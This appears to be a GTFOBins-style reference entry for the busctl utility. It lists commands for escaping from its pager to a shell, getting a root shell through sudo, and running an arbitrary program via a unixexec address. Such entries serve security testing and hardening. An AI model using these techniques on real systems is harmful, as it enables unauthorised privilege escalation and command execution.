---
description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
functions:
  shell:
    - code: |
        busctl --show-machine
        !/bin/sh
  sudo:
    - code: |
        sudo busctl --show-machine
        !/bin/sh
  command:
    - code: |
        busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=firefox,argv1=https://www.example.com
---
